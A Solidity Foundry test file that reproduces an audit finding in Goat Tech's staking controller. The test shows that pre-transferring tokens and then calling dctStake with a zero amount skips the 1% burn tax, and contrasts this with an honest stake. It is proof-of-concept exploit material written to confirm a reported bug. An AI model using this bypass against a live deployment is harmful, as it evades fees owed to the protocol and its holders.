// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./40665-a-user-calling-controllerdctstake-can-bypass-tax-by-first-tr.sol";

/*//////////////////////////////////////////////////////////////
    Goat Tech — A user calling Controller::dctStake can bypass tax
    by first transferring the tokens to be staked in a separate
    transaction. Finding #40665 (Cantina, cccz) — HIGH.

    Drives the synthetic Exploit and re-asserts the harm directly,
    contrasted against an honest dctStake() call that correctly
    pays the 1% tax.
//////////////////////////////////////////////////////////////*/
contract Goat40665Test is Test {
    Exploit exploit;

    function setUp() public {
        exploit = new Exploit();
    }

    /// @notice Control: an HONEST caller who calls dctStake(amount_, ...)
    ///         directly (without pre-funding the controller) pays the full
    ///         1% tax — 100 DCT staked locks only 99 DCT, 1 DCT is burned.
    function test_control_honestStake_paysTax() public {
        MockToken dct = new MockToken();
        MockToken dLocker = new MockToken();
        Controller controller = new Controller(dct, dLocker);

        dct.mint(address(this), 100 ether);
        dct.approve(address(controller), 100 ether);

        controller.dctStake(100 ether, address(this), 60 days);

        assertEq(dct.balanceOf(controller.DEAD()), 1 ether, "1% tax should be burned");
        assertEq(dLocker.balanceOf(address(this)), 99 ether, "only 99% should be locked");
    }

    /// @notice HARM: the attacker pre-funds the controller directly (a plain
    ///         transfer, not dctStake), then calls dctStake(0, ...). No tax
    ///         is burned, yet the full 100 DCT is locked as their stake —
    ///         a 1 DCT (1%) tax evasion versus the honest control above.
    function test_run_bypassesTax() public {
        exploit.run();

        Controller controller = exploit.controller();
        MockToken dct = exploit.dct();
        MockToken dLocker = exploit.dLocker();

        // No tax was ever burned.
        assertEq(dct.balanceOf(controller.DEAD()), 0);

        // The full 100 DCT is locked as the attacker's stake — 1 DCT more
        // than the 99 DCT an honest caller would have received for the
        // same 100 DCT outlay (see test_control_honestStake_paysTax).
        assertEq(dLocker.balanceOf(address(exploit)), 100 ether);
        assertEq(dct.balanceOf(address(controller)), 100 ether);
    }
}
